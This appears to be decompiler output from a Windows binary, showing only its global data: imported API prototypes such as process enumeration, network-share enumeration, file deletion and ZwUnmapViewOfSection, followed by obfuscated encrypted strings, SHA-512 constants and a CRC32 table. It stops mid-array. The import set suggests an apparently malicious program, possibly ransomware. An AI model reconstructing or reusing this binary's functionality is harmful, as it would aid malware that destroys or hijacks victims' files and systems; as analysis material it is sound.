// extern BOOL (__stdcall *GetProcessTimes)(HANDLE hProcess, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *GetSystemTimes)(PFILETIME lpIdleTime, PFILETIME lpKernelTime, PFILETIME lpUserTime);
// extern BOOL (__stdcall *SwitchToThread)();
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern BOOL (__stdcall *FlushFileBuffers)(HANDLE hFile);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern UINT (__stdcall *GetSystemWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern DWORD (__stdcall *GetEnvironmentVariableW)(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *SetProcessPriorityBoost)(HANDLE hProcess, BOOL bDisablePriorityBoost);
// extern DWORD (__stdcall *GetTickCount)();
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *Process32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *Process32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern UINT (__stdcall *GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern BOOL (__stdcall *GetVersionExW)(LPOSVERSIONINFOW lpVersionInformation);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *MoveFileExA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *RemoveDirectoryA)(LPCSTR lpPathName);
// extern BOOL (__stdcall *SetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *WNetEnumResourceW)(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// extern DWORD (__stdcall *WNetOpenEnumW)(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// extern DWORD (__stdcall *WNetCloseEnum)(HANDLE hEnum);
// extern DWORD (__stdcall *NetApiBufferFree)(LPVOID Buffer);
// extern DWORD (__stdcall *NetWkstaGetInfo)(LPWSTR servername, DWORD level, LPBYTE *bufptr);
// extern DWORD (__stdcall *NetServerGetInfo)(LPWSTR servername, DWORD level, LPBYTE *bufptr);
// extern HRESULT (__stdcall *SHGetFolderPathW)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);
// extern BOOL (__stdcall *ShellExecuteExW)(SHELLEXECUTEINFOW *pExecInfo);
// extern LPSTR (__stdcall *PathAddBackslashA)(LPSTR pszPath);
// extern LPSTR (__stdcall *PathFindFileNameA)(LPCSTR pszPath);
// extern LSTATUS (__stdcall *SHRegSetUSValueA)(LPCSTR pszSubKey, LPCSTR pszValue, DWORD dwType, const void *pvData, DWORD cbData, DWORD dwFlags);
// extern BOOL (__stdcall *PathAppendA)(LPSTR pszPath, LPCSTR pszMore);
// extern BOOL (__stdcall *PathIsDirectoryA)(LPCSTR pszPath);
// extern LPWSTR (__stdcall *PathFindFileNameW)(LPCWSTR pszPath);
// extern PWSTR (__stdcall *StrCpyNW)(PWSTR pszDst, PCWSTR pszSrc, int cchMax);
// extern PWSTR (__stdcall *StrCpyW)(PWSTR psz1, PCWSTR psz2);
// extern BOOL (__stdcall *PathFileExistsW)(LPCWSTR pszPath);
// extern PWSTR (__stdcall *StrCatW)(PWSTR psz1, PCWSTR psz2);
// extern int (__stdcall *wvnsprintfA)(PSTR pszDest, int cchDest, PCSTR pszFmt, va_list arglist);
// extern int (__stdcall *StrCmpW)(PCWSTR psz1, PCWSTR psz2);
// extern int (__stdcall *StrCmpIW)(PCWSTR psz1, PCWSTR psz2);
// extern PWSTR (__stdcall *StrStrIW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
// extern PSTR (__stdcall *StrStrIA)(PCSTR pszFirst, PCSTR pszSrch);
// extern PSTR (__stdcall *StrCatBuffA)(PSTR pszDest, PCSTR pszSrc, int cchDestBuffSize);
// extern PWSTR (__stdcall *StrNCatW)(PWSTR psz1, PCWSTR psz2, int cchMax);
// extern int (*wnsprintfA)(PSTR pszDest, int cchDest, PCSTR pszFmt, ...);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
// extern LPSTR (__stdcall *CharLowerA)(LPSTR lpsz);
// extern LPSTR (__stdcall *CharUpperA)(LPSTR lpsz);
// extern NTSTATUS (__stdcall *ZwQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
// extern NTSTATUS (__stdcall *ZwUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
// extern int (__stdcall *StringFromGUID2)(const GUID *const rguid, LPOLESTR lpsz, int cchMax);
_UNKNOWN unk_4192C4; // weak
void (*dword_4192D0)(void) = NULL; // weak
_UNKNOWN unk_4192D4; // weak
void (*dword_4192D8[9])(void) = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL }; // weak
const struct _EXCEPTION_POINTERS ExceptionInfo = { &dword_425470, &dword_4254C8 }; // idb
_UNKNOWN unk_419790; // weak
int dword_41A0B0[] = { 2 }; // weak
wchar_t *off_41A0B4 = L"R6002\r\n- floating point support not loaded\r\n"; // weak
char byte_41B3A0[] = { '2' }; // weak
char byte_41B3A1[] = { 'k' }; // weak
char byte_41B3A2[] = { '@' }; // weak
char byte_41B3A3[] = { ']' }; // weak
char byte_41B3A4[31] =
{
  '\x1B',
  'V',
  '0',
  '\v',
  'R',
  'q',
  ']',
  '\x1B',
  'I',
  'f',
  '\x1E',
  '!',
  'n',
  '\x17',
  'X',
  '(',
  '\x10',
  '\a',
  ';',
  'L',
  'u',
  '/',
  'e',
  'x',
  'm',
  'a',
  '/',
  '\x17',
  '\x14',
  ';',
  'P'
}; // weak
char byte_41B3C3[] = { '\0' }; // weak
char byte_41B3C4[] = { '\x19' }; // weak
char byte_41B3C5[] = { 'I' }; // weak
char byte_41B3C6[] = { '7' }; // weak
char byte_41B3C7[33] =
{
  '@',
  '7',
  '~',
  'C',
  ';',
  'z',
  '\x1C',
  '\x0E',
  'J',
  '0',
  '\0',
  '\f',
  'T',
  '\x11',
  'F',
  '\x0F',
  '\x1B',
  '\x7F',
  '9',
  '\"',
  '>',
  '\xAD',
  '\x13',
  'Z',
  '\xE6',
  '\xA9',
  '5',
  '\x0F',
  '\x19',
  'G',
  '\x01',
  'x',
  '\0'
}; // weak
char byte_41B3E8[] = { '\x04' }; // weak
char byte_41B3E9[] = { '*' }; // weak
char byte_41B3EA[] = { 'N' }; // weak
char byte_41B3EB[] = { '|' }; // weak
char byte_41B3EC[19] =
{
  's',
  's',
  '\x03',
  '{',
  '\t',
  'd',
  '8',
  '\x1C',
  'E',
  '\x13',
  'H',
  '4',
  '\t',
  'y',
  '\x06',
  'K',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B3FF[] = { '\0' }; // weak
char byte_41B400[] = { 'E' }; // weak
char byte_41B401[] = { 'G' }; // weak
char byte_41B402[] = { '\"' }; // weak
char byte_41B403[21] =
{
  '\x1A',
  '\x16',
  '\x1C',
  'p',
  '\xA2',
  'p',
  '\x0E',
  '6',
  'N',
  '\'',
  'E',
  'v',
  '\x18',
  '<',
  '\xF9',
  'E',
  'T',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B418[] = { '\x06' }; // weak
char byte_41B419[] = { 'b' }; // weak
char byte_41B41A[] = { '\x18' }; // weak
char byte_41B41B[] = { 'V' }; // weak
char byte_41B41C[] = { '!' }; // weak
char byte_41B41D[34] =
{
  '\x17',
  '{',
  'H',
  'G',
  '\"',
  '`',
  'L',
  '_',
  '\x12',
  '~',
  '3',
  '>',
  'P',
  'f',
  '\x13',
  'V',
  'd',
  'x',
  '~',
  'P',
  ';',
  '€',
  '\x10',
  'd',
  '!',
  '\0',
  'u',
  '\r',
  'w',
  ']',
  '\x16',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B43F[] = { '\0' }; // weak
char byte_41B440[] = { 'U' }; // weak
char byte_41B441[] = { '\x17' }; // weak
char byte_41B442[] = { '{' }; // weak
char byte_41B443[] = { '+' }; // weak
char byte_41B444[36] =
{
  'Q',
  'y',
  '\xE5',
  'o',
  'g',
  '{',
  '#',
  '\x13',
  'Q',
  '?',
  '\xA9',
  '7',
  'u',
  'A',
  '/',
  'I',
  '\x18',
  '\x12',
  '\xEB',
  '\xE7',
  '\x1B',
  'n',
  '\xBA',
  '\x0E',
  '\xF5',
  '\x17',
  '>',
  '\xCF',
  '\b',
  '\xEB',
  '\"',
  '3',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B468[] = { '\x06' }; // weak
char byte_41B469[] = { 'k' }; // weak
char byte_41B46A[] = { '\n' }; // weak
char byte_41B46B[] = { '&' }; // weak
char byte_41B46C[] = { 'W' }; // weak
char byte_41B46D[58] =
{
  'P',
  'r',
  'y',
  '\x10',
  'D',
  '\x7F',
  '\x1D',
  'F',
  '\x1B',
  '7',
  'X',
  'J',
  '9',
  '+',
  '&',
  'M',
  'X',
  '\x01',
  '\x1B',
  '-',
  'f',
  '\x15',
  '*',
  '`',
  '\x0F',
  '\x0F',
  'g',
  'Q',
  '\x7F',
  'L',
  '$',
  '?',
  '(',
  '\v',
  '\x13',
  's',
  '+',
  'E',
  '\x1A',
  '\x04',
  '>',
  '{',
  '\"',
  '\x03',
  ',',
  '\b',
  '/',
  ')',
  '\'',
  'T',
  '}',
  'Z',
  '\x05',
  '|',
  'O',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B4A7[] = { '\0' }; // weak
char byte_41B4A8[] = { 'E' }; // weak
char byte_41B4A9[] = { '\x03' }; // weak
char byte_41B4AA[] = { 'a' }; // weak
char byte_41B4AB[] = { 'Y' }; // weak
char byte_41B4AC[60] =
{
  '7',
  '0',
  '\f',
  '\xE5',
  '8',
  'e',
  '\xA2',
  '\r',
  '\'',
  '\b',
  'm',
  'B',
  '/',
  'c',
  '\x1D',
  '_',
  '\b',
  '\x01',
  'r',
  'A',
  'e',
  '\x1B',
  '@',
  '+',
  '\x19',
  '\x05',
  '\r',
  '\xDD',
  'T',
  '\xD3',
  '3',
  'M',
  '4',
  '\"',
  'C',
  'Q',
  '\xBB',
  ' ',
  '\x06',
  '(',
  'U',
  'Q',
  '\x89',
  't',
  'W',
  'g',
  '\x1F',
  'R',
  'o',
  '8',
  '\xB0',
  '\x91',
  '\xA2',
  '\f',
  '\xD2',
  '€',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B4E8[] = { 'P' }; // weak
char byte_41B4E9[] = { '\x1B' }; // weak
char byte_41B4EA[] = { 'Z' }; // weak
char byte_41B4EB[2] = { 'b', '\0' }; // weak
char byte_41B4ED[26] =
{
  '\x18',
  'd',
  '\x06',
  'd',
  'A',
  ';',
  '9',
  'F',
  '[',
  'U',
  '8',
  '{',
  '1',
  '\v',
  '\x03',
  'N',
  'f',
  '_',
  'o',
  ' ',
  'j',
  '\x17',
  '\b',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41B507[] = { '\0' }; // weak
char byte_41B508[] = { '\x05' }; // weak
char byte_41B509[] = { 'r' }; // weak
char byte_41B50A[30] =
{
  '=',
  '\a',
  'h',
  'x',
  'J',
  'y',
  '\x03',
  'j',
  '\"',
  '!',
  '&',
  'H',
  '\0',
  '(',
  '\xE6',
  '2',
  'h',
  'b',
  '\a',
  '\t',
  'U',
  '\xE8',
  'Y',
  '\xEE',
  'T',
  ')',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
void *off_41C12C = &unk_42004D; // weak
void *off_41C144 = &unk_42004D; // weak
char byte_41E030[11] = { '7', '7', '8', ',', '\x1A', 'K', 'l', '\t', 'b', '\x05', '\b' }; // weak
char byte_41E03B[] = { '\0' }; // weak
char byte_41E398[] = { '2' }; // weak
char byte_41E399[] = { '\x16' }; // weak
char byte_41E39A[] = { 'd' }; // weak
char byte_41E39B[] = { 'H' }; // weak
char byte_41E39C[] = { '\x0E' }; // weak
char a6b4[8] = "€<€6B)4"; // weak
char byte_41E3A7[] = { '\0' }; // weak
char byte_41E3A8[] = { 'Y' }; // weak
char byte_41E3A9[] = { 'r' }; // weak
char byte_41E3AA[] = { '\x14' }; // weak
char byte_41E3AB[] = { '%' }; // weak
char byte_41E3AC[12] = { 'w', '\xE9', 'q', '\xB5', '\x10', '/', '_', 'S', '\0', '\0', '\0', '\0' }; // weak
char byte_41E3B8[] = { '\x1C' }; // weak
char byte_41E3B9[] = { '1' }; // weak
char byte_41E3BA[] = { '&' }; // weak
char byte_41E3BB[2] = { '3', '\x7F' }; // weak
char byte_41E3BD[50] =
{
  'W',
  'r',
  'b',
  'p',
  'O',
  '6',
  'M',
  'k',
  'n',
  '\x1D',
  '\x18',
  '\x1B',
  'L',
  'C',
  '\x04',
  'h',
  '\x06',
  'q',
  'j',
  'x',
  '+',
  'X',
  '\0',
  '5',
  '6',
  'h',
  '\x02',
  ']',
  '€',
  'b',
  'W',
  'q',
  '?',
  '\v',
  'x',
  'r',
  'y',
  'z',
  '\x11',
  '!',
  'h',
  ',',
  '\"',
  'E',
  '\t',
  '\v',
  '4',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41E3EF[] = { '\0' }; // weak
char byte_41E3F0[] = { '_' }; // weak
char byte_41E3F1[] = { ']' }; // weak
char byte_41E3F2[54] =
{
  'F',
  '@',
  '\xE6',
  '.',
  '\f',
  ':',
  '\f',
  '*',
  ')',
  '6',
  '\x10',
  '(',
  'N',
  'D',
  '^',
  '/',
  '<',
  'c',
  '\x05',
  '_',
  '\xE2',
  '\xF2',
  '\xF3',
  '6',
  '\x1B',
  'k',
  '%',
  '<',
  '\xF4',
  'u',
  '\x12',
  '\xF2',
  '\xE1',
  '\x19',
  '\xE0',
  '\x16',
  'X',
  '\xEB',
  '\xE3',
  '\xE6',
  '\xC1',
  'O',
  '.',
  '\xE7',
  '3',
  '!',
  '\x01',
  'U',
  'O',
  '0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_41E428[] = { '&' }; // weak
char byte_41E429[] = { '€' }; // weak
char byte_41E42A[] = { '}' }; // weak
char byte_41E42B[] = { '/' }; // weak
char byte_41E42C[] = { '\x1C' }; // weak
char byte_41E42D[10] = { '(', '*', 'N', '/', '!', '6', '\x11', '\0', '\0', '\0' }; // weak
char byte_41E437[] = { '\0' }; // weak
char byte_41E438[] = { 'G' }; // weak
char byte_41E439[] = { '\xE5' }; // weak
char byte_41E43A[] = { '\t' }; // weak
char byte_41E43B[] = { 'S' }; // weak
char byte_41E43C[12] = { 'P', 'D', '\x03', 'g', '\x19', 'N', ',', 'p', '\0', '\0', '\0', '\0' }; // weak
char byte_41E450[] = { '\x19' }; // weak
char byte_41E451[14] = { 'G', 'A', '7', '\x18', ',', '~', '*', '\b', '-', 'o', ' ', '_', 'J', '\0' }; // weak
char byte_41E45F[] = { '\0' }; // weak
char byte_41E460[16] =
{
  'P',
  ';',
  '\x14',
  'U',
  'k',
  '\a',
  '\xB0',
  'a',
  'b',
  'Y',
  '\x1A',
  'N',
  '\x18',
  '$',
  '\0',
  '\0'
}; // weak
char byte_41E470[11] = { '>', '\x0E', 'O', '\x03', '\\', '=', 'V', 'h', 'K', 'U', '\x7F' }; // weak
char byte_41E47B[13] =
{
  '\0',
  'm',
  'v',
  '\"',
  'r',
  '\x05',
  '/',
  '\x18',
  '\x1D',
  ':',
  '(',
  '\xEC',
  '\0'
}; // weak
__m128i stru_41E490[56] =
{
  { { 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 97, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 97, 98, 99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 109, 101, 115, 115, 97, 103, 101, 32, 100, 105, 103, 101, 115 } },
  { { 116, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108 } },
  {
    {
      109,
      110,
      111,
      112,
      113,
      114,
      115,
      116,
      117,
      118,
      119,
      120,
      121,
      122,
      0,
      0
    }
  },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 97, 98, 99, 100, 98, 99, 100, 101, 99, 100, 101 } },
  {
    {
      102,
      100,
      101,
      102,
      103,
      101,
      102,
      103,
      104,
      102,
      103,
      104,
      105,
      103,
      104,
      105
    }
  },
  {
    {
      106,
      104,
      105,
      106,
      107,
      105,
      106,
      107,
      108,
      106,
      107,
      108,
      109,
      107,
      108,
      109
    }
  },
  {
    { 110, 108, 109, 110, 111, 109, 110, 111, 112, 110, 111, 112, 113, 0, 0, 0 }
  },
  { { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74 } },
  { { 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90 } },
  {
    {
      97,
      98,
      99,
      100,
      101,
      102,
      103,
      104,
      105,
      106,
      107,
      108,
      109,
      110,
      111,
      112
    }
  },
  {
    { 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51, 52, 53 }
  },
  { { 54, 55, 56, 57, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },
  { { 0, 0, 0, 0, 0, 0, 0, 49, 50, 51, 52, 53, 54, 55, 56, 57 } },
  { { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53 } },
  { { 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49 } },
  { { 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55 } },
  { { 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51 } },
  { { 52, 53, 54, 55, 56, 57, 48, 0, 0, 0, 0, 0, 1, 0, 0, 0 } },
  { { 3, 0, 0, 0, 14, 0, 0, 0, 26, 0, 0, 0, 56, 0, 0, 0 } },
  { { 62, 0, 0, 0, 80, 0, 0, 0, -100, 17, -123, -91, -59, -23, -4, 84 } },
  {
    { 97, 40, 8, -105, 126, -24, -11, 72, -78, 37, -115, 49, 11, -36, -99, 45 }
  },
  {
    {
      37,
      107,
      62,
      -23,
      -38,
      -82,
      52,
      123,
      -26,
      -12,
      -36,
      -125,
      90,
      70,
      127,
      -2
    }
  },
  {
    {
      -114,
      -78,
      8,
      -9,
      -32,
      93,
      -104,
      122,
      -101,
      4,
      74,
      -114,
      -104,
      -58,
      -80,
      -121
    }
  },
  {
    { -15, 90, 11, -4, 93, 6, -119, -17, 73, -46, -6, -27, 114, -72, -127, -79 }
  },
  { { 35, -88, 95, -6, 33, 89, 95, 54, -9, 28, 39, 16, -100, 105, 44, 27 } },
  {
    {
      86,
      -69,
      -36,
      -21,
      91,
      -99,
      40,
      101,
      -77,
      112,
      -115,
      -68,
      18,
      -96,
      83,
      56
    }
  },
  {
    {
      74,
      -100,
      12,
      -120,
      -28,
      5,
      -96,
      108,
      39,
      -36,
      -12,
      -102,
      -38,
      98,
      -21,
      43
    }
  },
  {
    {
      -80,
      -30,
      11,
      110,
      49,
      22,
      100,
      2,
      -122,
      -19,
      58,
      -121,
      -91,
      113,
      48,
      121
    }
  },
  {
    { -78, 31, 81, -119, -101, 117, 46, 69, 87, 61, 75, 57, -12, -37, -45, 50 }
  }
}; // weak
int SHA512_Constants_41E818 = 1116352408; // weak
int SHA512_Constants_41E81C = 1899447441; // weak
int SHA512_Constants_41E820 = -1245643825; // weak
int SHA512_Constants_41E824 = -373957723; // weak
int dword_41E828 = 961987163; // weak
int dword_41E82C = 1508970993; // weak
int dword_41E830 = -1841331548; // weak
int dword_41E834 = -1424204075; // weak
_UNKNOWN unk_41ED60; // weak
_UNKNOWN unk_41ED90; // weak
_UNKNOWN unk_41EDC0; // weak
_UNKNOWN unk_41EDF0; // weak
_UNKNOWN unk_41EE20; // weak
_UNKNOWN unk_41EE50; // weak
_UNKNOWN unk_41EE80; // weak
_UNKNOWN SHA512_Constants_41EEB0; // weak
_UNKNOWN unk_41F130; // weak
int dword_4205D0[128] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307
}; // weak
__m128i stru_423000 = { { 13, 14, 15, 12, 13, 14, 15, 12, 13, 14, 15, 12, 13, 14, 15, 12 } }; // weak
__m128i stru_423010 = { { 5, 6, 7, 4, 5, 6, 7, 4, 5, 6, 7, 4, 5, 6, 7, 4 } }; // weak
__m128i stru_423020 = { { 13, 14, 15, 12, 13, 14, 15, 12, 13, 14, 15, 12, 13, 14, 15, 12 } }; // weak
__m128i stru_423030 = { { 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0 } }; // weak
__m128i stru_423040 = { { 27, 0, 0, 0, 27, 0, 0, 0, 27, 0, 0, 0, 27, 0, 0, 0 } }; // weak
int dword_423060[] = { 1 }; // weak
int dword_423064[89] =
{
  22,
  2,
  2,
  3,
  2,
  4,
  24,
  5,
  13,
  6,
  9,
  7,
  12,
  8,
  12,
  9,
  12,
  10,
  7,
  11,
  8,
  12,
  22,
  13,
  22,
  15,
  2,
  16,
  13,
  17,
  18,
  18,
  2,
  33,
  13,
  53,
  2,
  65,
  13,
  67,
  2,
  80,
  17,
  82,
  13,
  83,
  13,
  87,
  22,
  89,
  11,
  108,
  13,
  109,
  32,
  112,
  28,
  114,
  9,
  6,
  22,
  128,
  10,
  129,
  10,
  130,
  9,
  131,
  22,
  132,
  13,
  145,
  41,
  158,
  13,
  161,
  2,
  164,
  11,
  167,
  13,
  183,
  17,
  206,
  2,
  215,
  11,
  1816,
  12
}; // weak
_UNKNOWN unk_4231C8; // weak
_UNKNOWN unk_4231CC; // weak
void *off_4231D0 = &unk_429F20; // weak
_UNKNOWN unk_4231E0; // weak
_UNKNOWN unk_423240; // weak
_UNKNOWN unk_423430; // weak
char *off_423450 = "(null)"; // weak
int dword_423460 = -1153374642; // weak
int dword_423474 = -1; // weak
DWORD dwTlsIndex = 4294967295u; // idb
LPCRITICAL_SECTION lpCriticalSection[88] =
{
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  NULL,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
  NULL,
  NULL,
  (LPCRITICAL_SECTION)1,
  NULL,
